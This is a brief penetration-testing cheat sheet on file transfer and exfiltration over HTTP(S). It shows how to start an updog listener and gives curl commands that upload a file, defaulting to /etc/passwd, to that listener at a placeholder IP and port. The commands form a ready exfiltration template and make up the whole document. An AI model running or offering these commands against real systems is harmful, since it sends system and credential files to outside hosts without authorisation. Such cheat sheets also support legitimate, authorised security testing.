# FileTransfer-HTTP(s)

% file transfer, exfiltration, injecton

#plateform/linux #target/serve  #cat/ATTACK/LISTEN-SERVE 


## updog server
#plateform/linux #target/serve  #cat/ATTACK/LISTEN-SERVE 
```
updog -d $(pwd) -p <lport> [--ssl]
```

= lport : 8080

## curl - upload to updog (http)
For secured by password use http://:<password>@<ip>:<port>/upload
```
curl -XPOST -F "file=@<file|/etc/passwd>;filename=<filename>" -F "path=<path>" http://<ip>:<port|9090>/upload
```

## curl - upload to updog (https)
For secured by password use http://:<password>@<ip>:<port>/upload
```
curl -XPOST -k -F "file=@<file|/etc/passwd>;filename=<filename>" -F "path=<path>" https://<ip>:<port|9090>/upload
```
